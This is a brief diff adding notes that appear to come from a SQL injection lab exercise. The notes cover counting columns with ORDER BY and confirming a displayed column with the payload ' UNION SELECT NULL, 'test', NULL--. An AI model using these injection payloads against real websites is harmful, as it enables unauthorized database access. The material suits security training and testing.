@@ -1,0 +1,6 @@
+1. Determined the number of columns using ' ORDER BY 1--, 2, 3
+2. Found that there are 3 columns
+3. Determined that column 2 is displayed
+4. Inserted text into column 2: ' UNION SELECT NULL, 'test', NULL--
+
+Payload: ' UNION SELECT NULL, 'test', NULL--
